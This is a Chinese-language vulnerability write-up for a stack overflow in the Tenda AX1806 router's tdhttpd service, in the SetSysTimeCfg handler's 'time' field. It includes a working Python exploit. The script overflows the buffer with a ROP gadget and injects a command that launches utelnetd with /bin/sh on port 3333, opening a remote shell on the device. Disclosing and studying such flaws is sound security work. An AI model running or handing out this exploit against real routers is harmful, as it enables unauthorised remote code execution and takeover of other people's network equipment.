# 漏洞描述

设备：Tenda-AX1806 v1.0.0.1 https://www.tenda.com.cn/download/detail-3306.html

漏洞类型：栈溢出

攻击效果：远程任意代码执行或拒绝服务

# 漏洞成因

该漏洞发生于tdhttpd文件的fromSetSysTime函数中，goform/SetSysTimeCfg页面

![image-20220208175329650](image/1.png)

v6通过直接调用sscanf被输入到栈上，而缺少相应的安全检查

而v6来自数据包中的time

因此造成栈溢出，攻击者可借此构造payload进行远程任意代码执行或拒绝服务攻击

# POC

任意代码执行的攻击脚本：

```python
# Title: Exploit of Tenda-AX3's buffer overflow 
# Author: R1nd0&c0rn
# Date: 2022
# Vendor Homepage: https://www.tenda.com.cn/
# Version: AX1806 v1.0.0.1

import requests
from pwn import *

gadget = 0x37208

url = "https://192.168.2.1/goform/SetSysTimeCfg"

timeType = "manual"

time = b"2022-01-01 "

time += b"a" * 0x380 
time += b"bbbb"
time += b";"
time += b"/usr/sbin/utelnetd -l /bin/sh -p 3333"# command
time += b":"
time += b"c" * 0x374 + p32(gadget)

r = requests.post(url, data={'timeType': timeType, 'time': time},verify=False)
print(r.content)
```

